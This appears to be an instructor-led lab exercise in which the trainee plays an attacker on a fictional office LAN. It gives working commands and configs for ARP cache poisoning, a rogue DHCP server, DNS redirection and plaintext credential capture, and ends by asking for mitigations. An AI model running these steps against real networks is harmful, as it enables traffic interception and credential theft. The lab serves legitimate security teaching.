# The Silent Snoop

Objective: Act as an APT actor (`APT-77`, "ARP Phantom") to poison the local network's Address Resolution Protocol (ARP) tables and deploy a rogue DHCP server. This will position you as a silent intermediary for all traffic, allowing you to capture plaintext credentials and manipulate DNS resolution.

Scenario: The [OpenHands International](entity.md) office LAN uses a flat network structure with minimal segmentation. Your goal is to establish a persistent MitM position on this local network segment to intercept unencrypted traffic and redirect users to a malicious credential-harvesting portal.

## Phase 1: Network Reconnaissance & Topology Mapping

Goal: Understand the local network's addressing scheme and identify key targets like the default gateway and DNS server.

Instructions:

1.  Access Your Foothold:
    *   You have gained physical access to the OpenHands office and plugged your laptop into a network jack. A Linux VM on your laptop is your attack platform.
    *   Command: `ssh volunteer@localhost` (or log in directly to the VM desktop)
    *   Password: `[Provided by Lab Instructor]`

2.  Discover Your Network Configuration:
    *   Your machine should have received an IP address via DHCP. Find your IP, subnet mask, and most importantly, the default gateway.
    *   Command: `ip addr show` and `ip route show default`
    *   Your IP: `[DISCOVER THIS]`
    *   Default Gateway IP: `[DISCOVER THIS]` - This is your primary target. Note it as `GATEWAY_IP`.

3.  Map the Active Network:
    *   Perform an ARP scan to discover other live hosts on your local subnet without being too noisy.
    *   Command: `sudo netdiscover -i eth0 -r <your_subnet>/24` (e.g., if your IP is `192.168.1.50`, use `-r 192.168.1.0/24`)
    *   Finding: Note the IP and MAC address of the default gateway. Also, identify the IP of a colleague's workstation.
    *   Gateway MAC Address: `[DISCOVER THIS]`
    *   Colleague Workstation IP: `[DISCOVER THIS]` - Note it as `VICTIM_IP`.

4.  Identify the Legitimate DHCP Server:
    *   Often, the gateway is also the DHCP server. Check your system's DHCP lease file or try to identify it via network traffic.
    *   Command: `cat /var/lib/dhcp/dhclient.leases` or `sudo tcpdump -i eth0 -n port 67 or port 68 -c 5`
    *   Finding: What is the IP address of the DHCP server? It is likely your `GATEWAY_IP`.
    *   DHCP Server IP: `[CONFIRM THIS]`

Checkpoint: You have mapped the local network and identified the critical network infrastructure: the gateway and a victim machine.

## Phase 2: ARP Cache Poisoning (Machine-in-the-Middle)

Goal: Poison the ARP caches of the victim and the gateway to make them believe your MAC address is associated with the other's IP.

Instructions:

1.  Enable IP Forwarding:
    *   On your attacker machine, enable kernel-level IP forwarding. This ensures that after you intercept traffic, you can forward it on to its real destination, making the attack silent and persistent.
    *   Command: `sudo sysctl -w net.ipv4.ip_forward=1`

2.  Launch the ARP Poisoning Attack:
    *   We will use the tool `arpspoof` from the `dsniff` suite to perform the poisoning.
    *   Terminal 1 - Poison the Victim: Open a new terminal and tell the victim machine: "I am the gateway.":

    ```bash
    sudo arpspoof -i eth0 -t <VICTIM_IP> <GATEWAY_IP>
    ```
    *   Terminal 2 - Poison the Gateway: Open another terminal and tell the gateway: "I am the victim machine.":

    ```bash
    sudo arpspoof -i eth0 -t <GATEWAY_IP> <VICTIM_IP>
    ```

3.  Verify the attack is working:
    *   On your attacker machine, check your ARP table. It should correctly map the IPs to their real MAC addresses.
    *   On the victim machine (ask your instructor for access or simulate it), check its ARP table. The `GATEWAY_IP` should now be mapped to *your* machine's MAC address.
    *   Command on Victim (simulated): `arp -a`
    *   Finding: What MAC address does the victim have for the gateway? It should be your MAC address.
    *   Victim's ARP Entry for Gateway: `[YOUR MAC ADDRESS]`

Checkpoint: You are now a silent intermediary. All traffic between the victim and the gateway flows through your machine. You can begin intercepting.

## Phase 3: Traffic Interception & Credential Harvesting

Goal: Use a network sniffer to capture plaintext traffic and harvest credentials from unencrypted protocols.

Instructions:

1.  Capture Passing Traffic:
    *   Open a third terminal on your attacker machine. Use `tcpdump` to capture any HTTP traffic (which is unencrypted) for analysis.
    *   Command: `sudo tcpdump -i eth0 -w captured_http.pcap port 80 and host <VICTIM_IP>`

2.  Trigger Data Generation (Optional):
    *   Inform your lab instructor. They may have the "victim" machine browse to an internal HTTP-only login page (e.g., a legacy intranet site) and enter dummy credentials.

3.  Analyse the Capture for Credentials:
    *   Stop the `tcpdump` capture after a minute. Transfer the file to your home directory and open it in Wireshark.
    *   Command: `wireshark captured_http.pcap`
    *   Finding: In Wireshark, apply the filter `http.request.method == POST`. Follow the TCP stream of this packet. Can you find the submitted username and password in plaintext?
    *   Exfiltrated Credentials: `username=[DISCOVER THIS]&password=[DISCOVER THIS]`

Checkpoint: You have successfully intercepted and harvested plaintext credentials due to the use of an unencrypted protocol.

## Phase 4: Deploying a Rogue DHCP Server (Persistence)

Goal: Go beyond a single victim. Deploy a malicious DHCP server to assign yourself as the default gateway and DNS server for *every new device* on the network.

Instructions:

1.  Configure the Rogue DHCP Server:
    *   The tool `isc-dhcp-server` is pre-installed. You need to edit its configuration file.
    *   Command: `sudo nano /etc/dhcp/dhcpd.conf`
*   Configuration to add:

```text
authoritative;
subnet 192.168.1.0 netmask 255.255.255.0 {
  range 192.168.1.100 192.168.1.200;
  option routers <YOUR_ATTACKER_IP>;    # You become the gateway
  option domain-name-servers <YOUR_ATTACKER_IP>; # You become the DNS server
}
```

  *   *Adjust the subnet to match your lab environment.*

2.  Start the Rogue Server:
    *   Start the DHCP server on your network interface. This will respond to DHCP requests faster than the legitimate server.
*   Commands:

```bash
sudo systemctl stop systemd-resolved  # Stop any conflicting service
sudo dhcpd -f -d eth0 &               # Start the rogue server in the foreground
```

3.  Force Clients to Reconnect:
    *   Ask your instructor to release and renew the DHCP lease on another lab machine (the "victim").
    *   Command on Victim (simulated): `sudo dhclient -r eth0 && sudo dhclient eth0`
    *   Verification: After the victim renews, check its new gateway and DNS server. They should now be your attacker IP.
    *   Victim's New Gateway: `[YOUR_ATTACKER_IP]`

Checkpoint: You have achieved network-level persistence. Any new device joining the network or renewing its lease will now be routed through you.

## Phase 5: DNS Manipulation (Optional Bonus)

Goal: Since you are now the DNS server for poisoned clients, you can manipulate their internet traffic.

Instructions:

1.  Set Up a Simple DNS Server:
    *   Use a simple tool like `dnschef` to run a fake DNS server that redirects all queries to an IP you control (e.g., for a phishing site).
    *   Command: `sudo dnschef --fakeip=<YOUR_ATTACKER_IP> --interface=<YOUR_ATTACKER_IP> --port=53`

2.  Test the DNS Redirection:
    *   On the victim machine, try to browse to `http://www.google.com`. The request will be sent to your machine's web server instead.
    *   Observation: If you set up a simple HTTP server on your machine (`sudo python3 -m http.server 80`), you will see the victim's request in your logs.

Final Report: Document all the `[DISCOVER THIS]` fields. Explain the impact of ARP and DHCP poisoning on network security. Propose two mitigations to prevent these attacks (e.g., DHCP Snooping, Dynamic ARP Inspection).
